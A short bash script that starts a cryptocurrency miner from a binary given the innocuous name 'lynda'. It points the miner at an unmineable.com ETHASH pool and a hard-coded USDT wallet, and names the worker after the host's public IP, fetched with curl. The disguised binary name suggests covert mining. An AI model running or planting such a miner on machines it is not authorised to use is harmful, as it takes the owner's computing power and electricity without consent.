#!/bin/bash

POOL=ethash.unmineable.com:3333
WALLET=USDT:TMoY6tAtNEAq32F7aAdXJb6o6fxYm2Nhhm
WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )#bi0o-a2ol

cd "$(dirname "$0")"

chmod +x ./lynda && ./lynda --algo ETHASH --pool $POOL --user $WALLET.$WORKER -ethstratum ETHPROXY $@